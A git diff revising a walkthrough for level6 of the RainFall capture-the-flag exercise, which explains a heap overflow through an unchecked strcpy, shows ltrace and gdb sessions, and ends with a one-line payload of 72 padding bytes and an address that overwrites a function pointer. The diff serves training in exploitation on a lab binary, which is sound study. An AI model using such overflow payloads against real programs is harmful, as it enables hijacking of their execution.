@@ -10,7 +10,7 @@ Because the `char* dest` is located before our function pointer in memory, we ca
 As we can see, the strcpy copies over the entire argv[1] without checking the size.
 
 
-We can get the addresses from malloc by running `ltrace`.
+We can get the return addresses from malloc by running `ltrace`.
 ```shell
 level6@RainFall:~$ ltrace ./level6 
 __libc_start_main(0x804847c, 1, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
@@ -21,7 +21,9 @@ strcpy(0x0804a008, NULL <unfinished ...>
 +++ killed by SIGSEGV +++
 level6@RainFall:~$ 
 ```
+*It segfaults because strcpy expects an argument from `argv`*
 
+Let's try to write more data to our buffer and check what it does in memory:
 ```shell
 level6@RainFall:~$ gdb -q level6 
 Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
@@ -45,7 +47,7 @@ Breakpoint 1, 0x080484ca in main ()
 (gdb) 
 ```
 
-
+We can see that after 72 characters we can rewrite the address of the following malloc region with what we want to call, let's do just that:
 ```shell
 level6@RainFall:~$ ./level6 $(python -c 'print 72 * "A" + "\x54\x84\x04\x08"')
 [...]
